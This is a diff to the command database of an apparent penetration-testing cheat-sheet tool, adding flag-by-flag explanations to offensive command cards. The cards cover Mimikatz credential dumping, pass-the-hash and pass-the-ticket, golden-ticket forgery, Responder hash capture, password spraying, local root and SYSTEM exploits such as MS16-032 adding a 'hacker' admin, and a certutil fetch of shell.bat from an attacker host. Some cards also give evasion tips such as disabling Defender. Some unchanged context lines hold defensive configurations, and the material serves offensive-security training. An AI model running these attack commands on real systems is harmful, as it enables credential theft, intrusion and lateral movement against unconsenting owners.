@@ -41642,7 +41798,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Firefox saved passwords (no master password set):\n# ~/.mozilla/firefox/*/logins.json -> decryptable with firefox-decrypt\n# All saved site passwords accessible without any authentication\n\n# Cleartext passwords in network capture:\n# tcpdump/Wireshark: FTP, HTTP Basic, LDAP simple bind all transmit creds in cleartext\n# tshark -r capture.pcap -Y 'ftp.request.command==\"PASS\"' -T fields -e ftp.request.arg",
         "secure_config": "# Firefox: enable Primary Password (master password):\n# Settings -> Privacy & Security -> Use Primary Password\n# Without this, all saved passwords are decryptable by any user-level process\n\n# Enforce encrypted protocols:\n# Replace FTP with SFTP/FTPS, HTTP with HTTPS, LDAP with LDAPS\n# STARTTLS minimum for all mail protocols\n\n# Network DLP:\n# Proxy with TLS inspection for all egress (catches cleartext and detects exfil)\n# IDS rules detecting cleartext credential patterns (FTP PASS, HTTP Basic)\n\n# Credential hunting prevention:\n# LAPS for local admin (unique per-machine passwords, not stored in shares)\n# Secrets management (Vault) instead of config file passwords\n# MDM/Intune policy: prevent 3rd-party password managers storing to cloud"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Sweeps a Linux host for secrets across many sources with one loop:\n  find / -name *.cnf       locate config files (the example targets MySQL-style .cnf)\n  grep -v 'doc\\|lib'       drop noisy doc/library paths\n  grep 'user\\|password\\|pass'   pull credential-looking lines from each file\n  grep -v '\\#'             ignore commented-out lines\nThe variation tabs repeat this for .conf/.config, database files, notes/scripts, and auth logs - combine with a manual read of crontab and .bash_history."
     },
     {
       "id": "ptt-linux",
@@ -41779,7 +41936,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
         "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Reuses Kerberos credentials on domain-joined Linux (pass-the-ticket):\n  export KRB5CCNAME=<ccache_file>   point Kerberos at a ccache (usually /tmp/krb5cc_*)\nklist confirms the loaded ticket; then authenticate with -k (e.g. smbclient -k, secretsdump -k). Or run kinit -k -t <keytab> to get a fresh TGT from a keytab. impacket-ticketConverter turns a ccache into a Windows .kirbi."
     },
     {
       "type": "command",
@@ -42111,7 +42269,8 @@ const COMMAND_DATA = {
           "MITRE T1548",
           "MITRE T1136.001"
         ]
-      }
+      },
+      "explain": "Escalates when /etc/passwd is writable by adding a root-equivalent account:\n  openssl passwd <password>   generate a crypt hash to put in the password field\nAppend an entry with uid 0 (e.g. root2:<hash>:0:0:...:/bin/bash) and su to it for root. The variation uses an empty password field (root3::0:0:...) so no password is needed at all."
     },
     {
       "type": "command",
@@ -42316,7 +42475,8 @@ const COMMAND_DATA = {
         "misconfiguration": "LLMNR enabled (default on all Windows). NBT-NS enabled. SMB signing not required on workstations (default). No IDS rule for unexpected LLMNR responses.",
         "vulnerable_config": "# LLMNR enabled (Windows default):\n# GPO: Computer Config → Admin Templates → Network → DNS Client\n# → Turn off multicast name resolution: NOT CONFIGURED\n\n# SMB signing not required on workstations:\nGet-SmbServerConfiguration | Select-Object RequireSecuritySignature  # False = relay possible\n\n# NBT-NS enabled (default Windows NIC binding)",
         "secure_config": "# Disable LLMNR via GPO:\n# Computer Config → Admin Templates → Network → DNS Client\n# → Turn off multicast name resolution: Enabled\n\n# Disable NBT-NS:\n$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter 'IPEnabled=True'\nforeach ($a in $adapters) { $a.SetTcpipNetbios(2) }  # 2 = Disable\n\n# Require SMB signing everywhere:\nSet-SmbClientConfiguration -RequireSecuritySignature $true -Force\nSet-SmbServerConfiguration -RequireSecuritySignature $true -Force\n\n# GPO equivalent:\n# Computer Config → Windows Settings → Security Settings → Local Policies → Security Options\n# → Microsoft network client: Digitally sign communications (always): Enabled\n# → Microsoft network server: Digitally sign communications (always): Enabled"
-      }
+      },
+      "explain": "Poisons broadcast name resolution to capture NetNTLMv2 hashes - no credentials required:\n  sudo responder           answer LLMNR/NBT-NS/MDNS name-resolution broadcasts as if you own the requested name\n  -I <interface>           the network interface to listen and respond on\n  -d                       also answer NetBIOS domain suffix queries\n  -w                       start the built-in WPAD rogue proxy\n  -v                       verbose (show captured hashes)\nWhen a host mistypes a name, it authenticates to you; crack the captured NetNTLMv2 offline (hashcat -m 5600) or relay it."
     },
     {
       "id": "cdsa-logman-etw",
@@ -42541,7 +42701,8 @@ const COMMAND_DATA = {
           "label": "Clone and compile logrotten if binary not available",
           "command": "git clone https://github.com/whotwagner/logrotten.git\ncd logrotten && gcc logrotten.c -o logrotten"
         }
-      ]
+      ],
+      "explain": "Exploits vulnerable logrotate (run as root) racing on a log you can write:\n  ./logrotten              win the rename race to execute a payload as root\n  -p ./payload             the payload script to run (often dropped into /etc/bash_completion.d)\n  <writable_log>           the log file logrotate rotates that you can append to\nCheck logrotate --version (3.8.6/3.11.0/3.15.0/3.18.0 vulnerable) and spam writes to the log to trigger rotation."
     },
     {
       "id": "ad-lookupsid",
@@ -43164,7 +43325,8 @@ const COMMAND_DATA = {
           "description": "Brute force SSH with both username and password lists. -f stops on first success."
         }
       ],
-      "type": "command"
+      "type": "command",
+      "explain": "Parallel login brute-forcer across many protocols:\n  medusa                   the cracker\n  -h <ip>                  the target host (-H for a host file)\n  -u <user>                the username (-U for a list)\n  -P <wordlist>            the password list\n  -M <module>              the protocol module (ssh, ftp, mysql, rdp, ...)\nAdd -n for a custom port, -t for threads, -f to stop on the first hit per host."
     },
     {
       "id": "medusa-web-form",
@@ -46202,7 +46364,8 @@ const COMMAND_DATA = {
           "label": "Run + note valid logins",
           "command": "run   # green [+] = valid"
         }
-      ]
+      ],
+      "explain": "Validates SMB credentials across hosts with Metasploit:\n  use auxiliary/scanner/smb/smb_login   the module; set RHOSTS, USER_FILE, PASS_FILE, then run\nUseful when a target negotiates SMBv3 and other brute tools fail; set SMBPass to an NT hash for a pass-the-hash check. A green [+] marks valid logins."
     },
     {
       "type": "command",
@@ -47009,7 +47172,8 @@ const COMMAND_DATA = {
           "label": "Pass-the-hash / crack",
           "command": "# crackmapexec smb <ip> -u Administrator -H <nt_hash>"
         }
-      ]
+      ],
+      "explain": "Dumps the local SAM password hashes from a SYSTEM-level Meterpreter session:\n  getsystem                elevate to NT AUTHORITY\\SYSTEM (needed to read the SAM)\n  hashdump                 extract local account NTLM hashes\nCrack the hashes offline (hashcat -m 1000) or pass-the-hash to other hosts. run post/windows/gather/smart_hashdump is the more robust module variant."
     },
     {
       "id": "meterpreter-getsystem",
@@ -47241,7 +47405,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Meterpreter runs entirely in memory (no disk artifact by default)\n# Reflective DLL injection into legitimate process (e.g., explorer.exe)\n# Traditional AV sees no malicious file = no alert\n\n# getsystem succeeds when:\n# - SeImpersonatePrivilege available (IIS/SQL service accounts)\n# - Named pipe impersonation technique works\n# - Kernel exploit token duplication works",
         "secure_config": "# EDR with memory scanning (Defender ATP, CrowdStrike, SentinelOne):\n# Detects reflective DLL injection patterns in memory\n# Detects Meterpreter C2 communication patterns\n\n# Enable Windows Defender Credential Guard:\n# Blocks kiwi from extracting creds from LSASS\n\n# SeImpersonatePrivilege restriction:\n# Remove from non-service accounts\n# Service accounts in Protected Users group where possible\n\n# Application allowlisting (WDAC):\n# Blocks execution of malicious stages even if dropped to disk\n# Blocks unsigned PowerShell scripts used for Meterpreter delivery"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Loads the Kiwi (Mimikatz) extension into Meterpreter for in-memory credential dumping:\n  load kiwi                pull the Kiwi extension into the session, adding creds_all/lsa_dump_* commands\nRequires SYSTEM to read protected material. Then lsa_dump_sam pulls local SAM hashes and lsa_dump_secrets pulls LSA secrets and cached domain creds."
     },
     {
       "id": "meterpreter-migrate",
@@ -47650,7 +47815,8 @@ const COMMAND_DATA = {
       },
       "tools": [
         "mimikatz"
-      ]
+      ],
+      "explain": "Runs DCSync from Windows with Mimikatz to pull an account's secrets via replication:\n  lsadump::dcsync          impersonate a DC replication partner\n  /domain:<domain>         the target domain\n  /user:<domain>\\<target>  the account whose NT hash, Kerberos keys, and password history to pull\nRequires DCSync rights (Domain Admin or delegated replication rights). No LSASS access on the target is needed."
     },
     {
       "id": "mimikatz-dpapi-chrome",
@@ -47764,7 +47930,8 @@ const COMMAND_DATA = {
           "label": "Decrypt Chrome logins",
           "command": "dpapi::chrome /in:\"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data\" /unprotect"
         }
-      ]
+      ],
+      "explain": "Decrypts the current user's saved browser passwords via DPAPI with Mimikatz:\n  dpapi::chrome            decrypt Chrome's Login Data database\n  /in:\"%LocalAppData%\\...\\Login Data\"   the SQLite store of saved site credentials\n  /unprotect               use the logged-on user's DPAPI master key to reveal them in cleartext\nRun in the victim user's context (or supply their master key). SharpChrome does the same and can also grab cookies."
     },
     {
       "id": "ad-mimikatz-sekurlsa",
@@ -47908,7 +48075,8 @@ const COMMAND_DATA = {
           "command": "privilege::debug\nsekurlsa::tickets /export",
           "label": "privilege::debug sekurlsa::tickets…"
         }
-      ]
+      ],
+      "explain": "Dumps live credentials from LSASS memory with Mimikatz:\n  privilege::debug         acquire SeDebugPrivilege (needs SYSTEM or an admin token)\n  sekurlsa::logonpasswords extract NTLM hashes, Kerberos keys, and sometimes cleartext passwords from every cached logon session\nUse the recovered hashes for pass-the-hash; sekurlsa::tickets /export saves TGTs/TGSs for pass-the-ticket."
     },
     {
       "id": "mimikatz-credman",
@@ -48015,7 +48183,8 @@ const COMMAND_DATA = {
           "label": "Dump Credential Manager secrets",
           "command": "sekurlsa::credman"
         }
-      ]
+      ],
+      "explain": "Extracts Credential Manager secrets cached in LSASS with Mimikatz:\n  privilege::debug         acquire SeDebugPrivilege (needed to read LSASS)\n  sekurlsa::credman        dump saved network share, RDP, and application logins from memory\nThese are creds Windows stored for the logged-on user; sekurlsa::dpapi and vault::cred reach the DPAPI vault entries too."
     },
     {
       "id": "ad-golden-ticket-mimikatz",
@@ -48148,7 +48317,8 @@ const COMMAND_DATA = {
           "label": "Access the parent DC",
           "command": "dir \\\\<parent_dc>\\C$"
         }
-      ]
+      ],
+      "explain": "Forges a Golden Ticket with Mimikatz, adding a foreign SID for cross-domain abuse:\n  kerberos::golden         forge a TGT offline\n  /user:<user> /domain:<child_domain> /sid:<child_sid>   the impersonated user, the child domain and its SID\n  /krbtgt:<krbtgt_hash>    the child krbtgt hash that signs the ticket\n  /sids:<parent_EA_sid>    ExtraSids - inject the parent Enterprise Admins SID into SID History\n  /ptt                     inject into the session\nSID History is not filtered inside a forest, so the ticket is treated as EA on the parent DC (dir \\\\<parent_dc>\\C$)."
     },
     {
       "id": "pth-mimikatz",
@@ -48247,7 +48417,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Machines with identical local admin passwords (the classic PtH enabler)\n# No credential guard, no Protected Users group\n# NTLM enabled (default on all Windows versions)\n\n# Confirm NTLM is negotiated (SMB example):\n# Network capture shows NTLMSSP_AUTH frames on port 445\n\n# Accounts NOT in Protected Users group (PtH works against these):\nGet-ADGroupMember 'Protected Users'  # should list all privileged accounts\n\n# Local admin SID S-1-5-21-...-500 (RID 500) allows remote PtH by default\n# Even with UAC RemoteRestrictions, RID-500 bypasses the filter",
         "secure_config": "# 1. Enable Credential Guard (blocks NTLM hash extraction from LSASS)\n# GPO: Computer Configuration > Admin Templates > System > Device Guard\n#   'Turn on Virtualization Based Security' = Enabled\n#   'Credential Guard Configuration' = Enabled with UEFI lock\n\n# 2. Add privileged accounts to Protected Users group (no NTLM, no RC4)\nAdd-ADGroupMember -Identity 'Protected Users' -Members 'Domain Admins'\n\n# 3. LAPS - unique random local admin passwords per machine\n# Eliminates lateral movement via shared local admin hash\nEnable-LapsADSchema\nSet-LAPSConfig -PolicyMode Automatic -PasswordLength 20 -PasswordAgeDays 30\n\n# 4. Block NTLM (requires AES Kerberos everywhere first)\n# GPO: Security Settings > Local Policies > Security Options\n#   'Network Security: Restrict NTLM: Incoming NTLM traffic' = Deny all\n\n# 5. Disable RID-500 remote admin:\n# HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n#   LocalAccountTokenFilterPolicy = 0 (default)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Pass-the-hash by spawning a process that carries injected credentials (Mimikatz):\n  sekurlsa::pth            over-pass-the-hash into a new logon session\n  /user:<user> /domain:<domain>   the identity to impersonate\n  /rc4:<nt_hash>           the NT hash used as the auth key (/ntlm is the same)\n  /run:cmd.exe             the process to launch with those creds\nRun privilege::debug first. The spawned shell authenticates as that user for onward SMB/WMI - use /run:powershell for a PS session."
     },
     {
       "id": "mimikatz-ptt",
@@ -48366,7 +48537,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# msDS-KeyCredentialLink writable by attacker (GenericWrite on target account):\n# pywhisker.py -t targetuser -a add\n# Adds a fake device credential -> obtain certificate for targetuser\n# -> PKINIT TGT as targetuser -> NTLM hash via UnPAC\n\n# LSASS memory contains TGTs for all logged-in users:\n# Mimikatz: sekurlsa::tickets /export\n# Rubeus: dump /all",
         "secure_config": "# Prevent msDS-KeyCredentialLink abuse:\n# Audit who has GenericWrite on privileged accounts\n# Only SYSTEM/DCs should write msDS-KeyCredentialLink\nGet-ObjectAcl -Identity admin -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'Write'}\n\n# Prevent ticket extraction:\n# Enable Credential Guard (blocks LSASS memory reads)\n# Protected Users group members: tickets not cached in LSASS\n\n# ADCS: prevent ESC1/ESC8 (see those cards)\n# Monitor: Event 4768 with certificate auth, Event 4769 unusual ticket lifetimes"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Injects a Kerberos ticket into the current Windows session (pass-the-ticket):\n  kerberos::ptt <ticket>   load this .kirbi/base64 ticket into the session\nGet tickets first with sekurlsa::tickets /export (privilege::debug needed), or dump keys with sekurlsa::ekeys and over-pass-the-hash via sekurlsa::pth. After injection, tools authenticate to services as the ticket's principal."
     },
     {
       "id": "crtp-mimikatz-cert-export",
@@ -48503,7 +48675,8 @@ const COMMAND_DATA = {
           "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
           "CRTP Domain Persistence"
         ]
-      }
+      },
+      "explain": "Exports certificates AND their private keys from the Windows stores, even keys marked non-exportable:\n  crypto::capi              patch CryptoAPI in memory so CAPI-backed keys become exportable\n  crypto::cng               patch the KeyIso/CNG service so CNG keys become exportable\n  crypto::certificates /export   dump certs+keys from the current-user store (add /systemstore:...LOCAL_MACHINE for the machine store)\nYou get .pfx files; use a client-auth cert with Rubeus asktgt /certificate to PKINIT as its owner."
     },
     {
       "id": "mimikatz-lsadump",
@@ -48654,7 +48827,8 @@ const COMMAND_DATA = {
         "sam",
         "lsa-secrets",
         "credential-dumping"
-      ]
+      ],
+      "explain": "Dumps the local SAM and LSA secrets with Mimikatz (needs SYSTEM):\n  privilege::debug         acquire debug privilege\n  token::elevate           steal a SYSTEM token to read the hives\n  lsadump::sam             extract local account NTLM hashes\n  lsadump::lsa /patch      extract LSA secrets, service account passwords, and cached domain creds\nlsadump::dcsync (in the same tool) pulls domain hashes via replication when you have the rights."
     },
     {
       "type": "command",
@@ -48744,7 +48918,8 @@ const COMMAND_DATA = {
           "MITRE T1140"
         ],
         "evasion": "Touch only what you need; remove any scheduled task/mounted disk/dropped file you create."
-      }
+      },
+      "explain": "Uses the certutil LOLBAS to download a payload over HTTP:\n  certutil.exe -urlcache   use the URL cache download function\n  -split                   split/handle the cached file\n  -f                       force overwrite of any cached copy\n  http://<lhost>:8080/shell.bat shell.bat   the source URL and local output name\nA living-off-the-land way to fetch tools past filters; certutil can also base64 encode/decode to smuggle payloads."
     },
     {
       "type": "command",
@@ -48833,7 +49008,8 @@ const COMMAND_DATA = {
           "MITRE T1563",
           "MITRE T1055"
         ]
-      }
+      },
+      "explain": "Attaches to a privileged user's tmux session left on a group-writable socket:\n  tmux -S /shareds         attach to the tmux server listening on this socket file\nIf a higher-privileged user started tmux on a socket your group can write, attaching drops you straight into their shell with their privileges."
     },
     {
       "type": "command",
@@ -48934,7 +49110,8 @@ const COMMAND_DATA = {
           "MITRE T1552.001"
         ],
         "evasion": "Touch only what you need; remove any scheduled task/mounted disk/dropped file you create."
-      }
+      },
+      "explain": "Mounts a found virtual disk to extract its credentials offline:\n  guestmount -a <disk>.vmdk   attach the VMDK/VHD(X) image\n  -i                       inspect it and mount its filesystems automatically\n  --ro /mnt/vmdk           read-only, at this mount point\nThen run impacket-secretsdump against the mounted SAM/SYSTEM/SECURITY hives to recover local account hashes."
     },
     {
       "type": "command",
@@ -49048,7 +49225,8 @@ const COMMAND_DATA = {
           "MITRE T1548.001",
           "MITRE T1210"
         ]
-      }
+      },
+      "explain": "Abuses an NFS export set to no_root_squash to run a root-owned SUID shell on the target:\n  sudo mount -t nfs <ip>:/<share> /mnt   mount the export locally as root\nWith no_root_squash, files you create as root on the mount keep uid 0 on the server. Copy a SUID /bin/bash shell into the share, chmod u+s it, then execute it on the target for a root shell. showmount -e and /etc/exports confirm the flag."
     },
     {
       "type": "command",
@@ -49146,7 +49324,8 @@ const COMMAND_DATA = {
           "MITRE T1040",
           "MITRE T1552"
         ]
-      }
+      },
+      "explain": "Sniffs local traffic for cleartext credentials on a multi-user host:\n  tcpdump                  capture packets on the host's interfaces\nOn a shared box you may see other users' cleartext logins; feed the capture to net-creds or PCredz to extract credentials automatically."
     },
     {
       "type": "command",
@@ -49248,7 +49427,8 @@ const COMMAND_DATA = {
           "MITRE T1053.005"
         ],
         "evasion": "Touch only what you need; remove any scheduled task/mounted disk/dropped file you create."
-      }
+      },
+      "explain": "Lists scheduled tasks to find one whose target you can write:\n  schtasks /query          enumerate scheduled tasks\n  /fo LIST /v              full verbose list output (shows Run As User and the task action)\nA task run by a privileged account whose script/binary is writable by you is an escalation path - replace the target and wait for the trigger."
     },
     {
       "type": "command",
@@ -49353,7 +49533,8 @@ const COMMAND_DATA = {
           "MITRE T1068"
         ],
         "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable - test against a snapshot to avoid crashing the target."
-      }
+      },
+      "explain": "Runs a task as SYSTEM via the MS10-092 Task Scheduler XML flaw (Metasploit local exploit):\n  use exploit/windows/local/ms10_092_schelevator   load the module\nRun it against an existing Meterpreter session (set SESSION, LHOST, LPORT) after migrating to a 64-bit process; it abuses a task-integrity flaw to execute as SYSTEM. Classic on Server 2008."
     },
     {
       "type": "command",
@@ -49467,7 +49648,8 @@ const COMMAND_DATA = {
           "label": "Run to add a local admin",
           "command": "Invoke-MS16-032 -Command \"net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add\""
         }
-      ]
+      ],
+      "explain": "Runs a command as SYSTEM via the MS16-032 Secondary Logon handle flaw:\n  Invoke-MS16-032          the PowerShell PoC (races the vulnerable service)\n  -Command \"net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add\"   the command to run as SYSTEM (here adding a local admin)\nNeeds 2+ CPU cores for the race. Works on unpatched Server 2008/2012 and Win7/8.1."
     },
     {
       "id": "msfvenom-aspx",
@@ -50382,7 +50564,8 @@ const COMMAND_DATA = {
           "label": "Execute OS commands",
           "command": "xp_cmdshell whoami /priv"
         }
-      ]
+      ],
+      "explain": "Gets OS command execution as the SQL service account through MSSQL:\n  mssqlclient.py <user>@<ip>   connect to SQL Server\n  -windows-auth            authenticate with Windows/NTLM creds\nThen enable_xp_cmdshell (or sp_configure 'xp_cmdshell',1; RECONFIGURE) and run xp_cmdshell whoami /priv. The service account often holds SeImpersonatePrivilege - the entry point for a potato attack."
     },
     {
       "id": "mssql-connect",
@@ -50602,7 +50785,8 @@ const COMMAND_DATA = {
           "label": "Enumerate links + privileges",
           "command": "Get-SQLServerLinkCrawl -Instance <instance> -Verbose"
         }
-      ]
+      ],
+      "explain": "Finds SQL Server instances and the account each runs as:\n  sc query | findstr SQL   list local services whose name contains SQL (to spot instances and their service accounts)\nThe steps use PowerUpSQL (Get-SQLInstanceDomain) to discover instances domain-wide and test access. If a service account holds SeImpersonatePrivilege, it is the pivot for a potato privesc."
     },
     {
       "type": "command",
@@ -50990,7 +51174,8 @@ const COMMAND_DATA = {
           "label": "Targeted RCE across the chain (-QueryTarget)",
           "command": "Get-SQLServerLinkCrawl -Instance <ip> -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget <final_server>"
         }
-      ]
+      ],
+      "explain": "Crawls MSSQL linked-server chains with PowerUpSQL to find and abuse trust links between SQL instances:\n  Get-SQLServerLinkCrawl    follow every linked server recursively from the entry instance\n  -Instance <ip>            the SQL server to start crawling from\n  -Verbose                  show each hop, its login context, and sysadmin status\nAdd -Query 'exec master..xp_cmdshell ...' to run OS commands on any reachable linked node (enabling xp_cmdshell across the link if needed) - links can cross domain/trust boundaries."
     },
     {
       "id": "ad-mssqlclient",
@@ -51091,7 +51276,8 @@ const COMMAND_DATA = {
           "label": "Pass-the-ticket",
           "command": "KRB5CCNAME=<ccache> mssqlclient.py -k <domain>/<user>@<target_fqdn>"
         }
-      ]
+      ],
+      "explain": "Connects to Microsoft SQL Server with impacket for command execution or pivoting:\n  mssqlclient.py           the MSSQL client\n  <domain>/<user>@<target>   the account and SQL host\n  -windows-auth            authenticate with Windows/NTLM domain creds (omit for SQL auth user:pass@host)\nOnce connected, enable_xp_cmdshell gives OS command execution, or use linked servers to pivot; -k reuses a Kerberos ticket."
     },
     {
       "id": "mysql-attack",
@@ -52499,7 +52685,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Weak domain password policy:\nGet-ADDefaultDomainPasswordPolicy\n# MinPasswordLength:    8    <-- too short\n# PasswordHistoryCount: 0    <-- no history, password reuse allowed\n# ComplexityEnabled:    False <-- no complexity\n# LockoutThreshold:     0    <-- NO lockout\n\n# Local SAM policy (workgroup machines):\n# Control Panel -> Local Security Policy -> Account Policies -> Password Policy\n# Same weak defaults as above",
         "secure_config": "# Set a strong domain password policy:\nSet-ADDefaultDomainPasswordPolicy -Identity corp.local \\\n    -MinPasswordLength 14 \\\n    -PasswordHistoryCount 24 \\\n    -ComplexityEnabled $true \\\n    -MaxPasswordAge 90.00:00:00 \\\n    -LockoutThreshold 5 \\\n    -LockoutDuration 00:30:00 \\\n    -LockoutObservationWindow 00:30:00\n\n# Fine-Grained PSO for privileged accounts (stricter):\nNew-ADFineGrainedPasswordPolicy -Name PrivilegedPSO \\\n    -MinPasswordLength 20 -PasswordHistoryCount 48 \\\n    -ComplexityEnabled $true -LockoutThreshold 3 \\\n    -LockoutDuration 01:00:00 -Precedence 1\nAdd-ADFineGrainedPasswordPolicySubject PrivilegedPSO -Subjects 'Domain Admins'\n\n# Deploy Azure AD Password Protection (blocks common passwords on-prem too)\n# Enable Microsoft Entra ID Smart Lockout"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Sprays credentials across a protocol with NetExec:\n  netexec <proto> <ip>     the protocol (smb, winrm, ssh, ...) and target\n  -u <userlist>            usernames to try\n  -p <wordlist>            passwords to try\nA [+] marks a valid pair; (Pwn3d!) means code execution is possible on that host. Add --shares to list accessible SMB shares once authenticated."
     },
     {
       "id": "pth-netexec",
@@ -52604,7 +52791,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Machines with identical local admin passwords (the classic PtH enabler)\n# No credential guard, no Protected Users group\n# NTLM enabled (default on all Windows versions)\n\n# Confirm NTLM is negotiated (SMB example):\n# Network capture shows NTLMSSP_AUTH frames on port 445\n\n# Accounts NOT in Protected Users group (PtH works against these):\nGet-ADGroupMember 'Protected Users'  # should list all privileged accounts\n\n# Local admin SID S-1-5-21-...-500 (RID 500) allows remote PtH by default\n# Even with UAC RemoteRestrictions, RID-500 bypasses the filter",
         "secure_config": "# 1. Enable Credential Guard (blocks NTLM hash extraction from LSASS)\n# GPO: Computer Configuration > Admin Templates > System > Device Guard\n#   'Turn on Virtualization Based Security' = Enabled\n#   'Credential Guard Configuration' = Enabled with UEFI lock\n\n# 2. Add privileged accounts to Protected Users group (no NTLM, no RC4)\nAdd-ADGroupMember -Identity 'Protected Users' -Members 'Domain Admins'\n\n# 3. LAPS - unique random local admin passwords per machine\n# Eliminates lateral movement via shared local admin hash\nEnable-LapsADSchema\nSet-LAPSConfig -PolicyMode Automatic -PasswordLength 20 -PasswordAgeDays 30\n\n# 4. Block NTLM (requires AES Kerberos everywhere first)\n# GPO: Security Settings > Local Policies > Security Options\n#   'Network Security: Restrict NTLM: Incoming NTLM traffic' = Deny all\n\n# 5. Disable RID-500 remote admin:\n# HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n#   LocalAccountTokenFilterPolicy = 0 (default)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Sprays an NT hash over SMB to find where it is valid and run commands:\n  netexec smb <ip>         one host or a whole CIDR\n  -u <user>                the account\n  -H <nt_hash>             authenticate by NT hash (pass-the-hash)\n  --local-auth             use the local account database instead of the domain\nAdd -x '<cmd>' to execute a command wherever the hash works - fast way to map credential reuse across a subnet."
     },
     {
       "id": "netexec-spray",
@@ -52693,7 +52881,8 @@ const COMMAND_DATA = {
           "label": "LDAP / WinRM protocols too",
           "command": "netexec winrm <cidr> -u <userlist> -p '<password>' | grep +"
         }
-      ]
+      ],
+      "explain": "Sprays one password against many accounts (optionally across a subnet):\n  netexec smb <cidr>       the SMB module against a whole subnet\n  -u <userlist>            the accounts to try\n  -p '<password>'          the single password sprayed to all\nSpraying (many users, one password) stays under lockout thresholds - the reverse of brute forcing; works over winrm/ldap too."
     },
     {
       "id": "ad-gmsa-read",
@@ -52790,7 +52979,8 @@ const COMMAND_DATA = {
           "label": "Use the NT hash for the gMSA account",
           "command": "# pass-the-hash / overpass-the-hash as the gMSA (often high-priv)"
         }
-      ]
+      ],
+      "explain": "Reads Group Managed Service Account passwords over LDAP if your account is an authorized reader:\n  nxc ldap <dc_ip>         NetExec against the DC's LDAP\n  -u <user> -p <password>  authenticate\n  --gmsa                   dump msDS-ManagedPassword (the gMSA NT hash) for accounts you can read\ngMSA accounts are often high-privileged; take the returned NT hash into pass-the-hash / overpass-the-hash."
     },
     {
       "id": "netexec-remote-dump",
@@ -52884,7 +53074,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Windows Credential Manager stores cleartext/encrypted creds:\ncmdkey /list\n# Manages: Domain:interactive=CORP\\svcaccount  (recoverable with DPAPI)\n\n# /etc/shadow accessible (bad permissions):\nls -la /etc/shadow  # -rw-r--r-- 1 root shadow (group-readable)\n# SHA-512 hashes: crackable with hashcat -m 1800",
         "secure_config": "# Windows: Credential Guard (prevents LSASS access)\n# Audit Credential Manager entries:\ncmdkey /list  # remove any unnecessary stored creds\n\n# Linux /etc/shadow permissions:\nchmod 640 /etc/shadow   # root:shadow only\nchmod 400 /etc/shadow   # even stricter: root read-only\n\n# Use yescrypt (default in Ubuntu 22+) instead of SHA-512:\n# /etc/login.defs: ENCRYPT_METHOD YESCRYPT  (memory-hard, much slower to crack)\n# Existing hashes: force password reset to migrate\n\n# Disable NTLM where possible (reduces hash theft value)\n# Enforce Kerberos AES (makes captured hashes harder to crack)"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Remotely dumps credential material over SMB with local-admin creds:\n  netexec smb <ip>         connect over SMB\n  --local-auth             authenticate against the local SAM, not the domain\n  -u <user> -p <password>  the local admin credentials\n  --sam                    pull local account NT hashes (use --lsa for LSA secrets and cached domain creds)\nOutput is logged under ~/.nxc/logs/; crack or pass-the-hash the results."
     },
     {
       "type": "command",
@@ -52993,7 +53184,8 @@ const COMMAND_DATA = {
           "MITRE T1068"
         ],
         "evasion": "Compile off-target and transfer only the final ELF; run once and clean it up; many public PoCs are unstable - verify the kernel/arch match before firing to avoid a panic."
-      }
+      },
+      "explain": "Matches the kernel to a netfilter (nf_tables) local-root exploit:\n  uname -r                 print the kernel release to compare against the CVE ranges\nThe variations map ranges to exploits: CVE-2021-22555 (2.6-5.11), CVE-2022-25636 (5.4-5.6.10), CVE-2023-32233 (up to 6.3.1) - clone, compile, and run the matching one for root."
     },
     {
       "id": "crtp-network-recon",
@@ -53073,7 +53265,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Flat internal network - workstations can reach all hosts on all ports. No NDR/netflow analysis between VLANs. Host firewall GPO not enforced.",
         "vulnerable_config": "# No host firewall GPO applied - workstations can reach all internal hosts:\n# Computer Config → Windows Settings → Security Settings → Windows Defender Firewall\n# → Domain Profile: No inbound restrictions between workstation VLANs\n\n# No network segmentation:\n# Workstations and servers in same VLAN",
